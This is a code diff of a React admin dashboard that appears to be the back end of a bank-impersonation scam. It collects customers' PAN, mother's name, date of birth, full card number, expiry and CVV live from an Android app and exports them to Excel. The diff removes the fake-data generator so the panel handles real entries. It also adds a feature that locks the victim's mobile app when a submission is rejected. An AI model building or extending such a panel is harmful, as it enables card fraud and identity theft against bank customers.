@@ -3,14 +3,13 @@ import AdminNavbar from './components/AdminNavbar';
 import StatCards from './components/StatCards';
 import SubmissionsTable from './components/SubmissionsTable';
 import SubmissionDetailModal from './components/SubmissionDetailModal';
-import { PlusCircle, ShieldCheck, Radio } from 'lucide-react';
+import { ShieldCheck, Radio } from 'lucide-react';
 import confetti from 'canvas-confetti';
 import logo from './assets/logo.png';
 import {
   subscribeToSubmissions,
   updateSubmissionStatus,
-  deleteSubmission,
-  addSimulationSubmission
+  deleteSubmission
 } from './firebase';
 
 export default function App() {
@@ -22,6 +21,11 @@ export default function App() {
   const [selectedDossier, setSelectedDossier] = useState(null);
   const [isLoading, setIsLoading] = useState(true);
 
+  // Clear any old mock demo data stored locally
+  useEffect(() => {
+    localStorage.removeItem('hdfc_admin_submissions');
+  }, []);
+
   // 1. Subscribe to real-time Firebase Firestore submissions
   useEffect(() => {
     setIsLoading(true);
@@ -32,7 +36,7 @@ export default function App() {
         setIsLoading(false);
       },
       (error) => {
-        console.warn('Firestore subscription fallback:', error);
+        console.warn('Firestore subscription notice:', error);
         setIsLiveConnected(false);
         setIsLoading(false);
       }
@@ -43,10 +47,12 @@ export default function App() {
     };
   }, []);
 
-  // 2. Status update (Approve / Reject) in Firebase and local state
+  // 2. Status update (Approve / Reject & Lock User) in Firebase and local state
   const handleUpdateStatus = async (id, newStatus) => {
     setSubmissions((prev) =>
-      prev.map((item) => (item.id === id ? { ...item, status: newStatus } : item))
+      prev.map((item) =>
+        item.id === id ? { ...item, status: newStatus, isLocked: newStatus === 'rejected' } : item
+      )
     );
 
     if (newStatus === 'approved') {
@@ -60,7 +66,7 @@ export default function App() {
     }
   };
 
-  // 3. Delete submission record
+  // 3. Delete submission record from Firestore
   const handleDeleteSubmission = async (id) => {
     setSubmissions((prev) => prev.filter((item) => item.id !== id));
     try {
@@ -70,45 +76,7 @@ export default function App() {
     }
   };
 
-  // 4. Add Simulation Record
-  const handleAddSampleRecord = async () => {
-    const sampleNames = ['Rohan Malhotra', 'Deepika Nair', 'Sanjay Patel', 'Anjali Gupta', 'Vikramaditya Rathore', 'Pooja Agarwal'];
-    const randomName = sampleNames[Math.floor(Math.random() * sampleNames.length)];
-    const services = ['increase_limit', 'rewards_points', 'login_card', 'card_to_card'];
-    const randomService = services[Math.floor(Math.random() * services.length)];
-
-    const formattedTime = new Date().toLocaleDateString('en-IN', {
-      day: '2-digit',
-      month: 'short',
-      year: 'numeric',
-      hour: '2-digit',
-      minute: '2-digit'
-    });
-
-    const newRecord = {
-      fullName: randomName,
-      dob: '14/08/1991',
-      panNumber: 'BKGP' + Math.floor(1000 + Math.random() * 9000) + 'K',
-      mothersName: 'Sunita ' + randomName.split(' ')[1],
-      mobileNumber: '9' + Math.floor(100000000 + Math.random() * 900000000),
-      selectedService: randomService,
-      nameOnCard: randomName.toUpperCase(),
-      cardNumber: '4' + Math.floor(100 + Math.random() * 900) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000),
-      expiryDate: '09/28',
-      cvv: '' + Math.floor(100 + Math.random() * 900),
-      status: 'pending',
-      submittedAt: formattedTime
-    };
-
-    try {
-      await addSimulationSubmission(newRecord);
-    } catch (err) {
-      console.error('Simulation write error:', err);
-      setSubmissions([{ id: 'HDFC-SIM-' + Date.now(), ...newRecord }, ...submissions]);
-    }
-  };
-
-  // 5. Single Dedicated Excel Export (.xls) with ALL 13 customer fields & preserved formatting
+  // 4. Single Dedicated Excel Export (.xls) with ALL 13 customer fields & preserved formatting
   const handleExportExcel = () => {
     const headers = [
       'Application ID',
@@ -194,7 +162,7 @@ export default function App() {
     document.body.removeChild(link);
   };
 
-  // 6. Filtered Submissions
+  // 5. Filtered Submissions
   const filteredSubmissions = submissions.filter((item) => {
     const matchesSearch =
       (item.fullName && item.fullName.toLowerCase().includes(searchTerm.toLowerCase())) ||
@@ -234,14 +202,8 @@ export default function App() {
             </div>
             <h2>Card Services · Real-Time Verification Portal</h2>
             <p>
-              Live sync active: Customer PAN, Mother's Name, DOB, and 16-Digit Card entries stream in real-time as submitted from the Android mobile app.
+              Live sync active: Customer PAN, Mother's Name, DOB, and 16-Digit Card entries stream in real-time directly from the Android mobile app. Rejecting a request immediately locks the user's mobile app.
             </p>
-          </div>
-          <div className="banner-actions">
-            <button className="btn-banner-action btn-banner-primary" onClick={handleAddSampleRecord}>
-              <PlusCircle size={16} />
-              <span>Simulate Customer Entry</span>
-            </button>
           </div>
         </div>
 
